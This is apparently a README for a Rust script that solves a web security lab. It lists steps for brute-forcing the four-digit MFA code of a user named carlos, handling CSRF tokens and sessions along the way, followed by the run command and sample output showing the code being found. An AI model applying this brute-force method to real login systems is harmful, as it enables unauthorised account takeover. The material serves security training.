## Hack Steps

1. Fetch the login page
2. Get the session cookie and extract the csrf token
3. Login in as carlos
4. Get the new session
5. Fetch the login2 page
6. Extract the csrf token
7. Post the mfa-code
8. Repeat the process with all possbile numbers

## Run Script

1. Change the URL of the lab
2. Start script

```
~$ cargo run
```

## Expected Output

```
⦗*⦘ Brute forcing the mfa-code of carlos..
❯❯ Elapsed: 2 minutes || Trying (1400/10000) 1124 => Wrong
⦗!⦘ Failed to post the code: 0082
❯❯ Elapsed: 4 minutes || Trying (1467/10000) 0164 => Wrong
🗹 Correct code: 0589
⦗*⦘ Fetching carlos profile.. OK
🗹 Finished in: 10 minutes
🗹 The lab should be marked now as solved
```
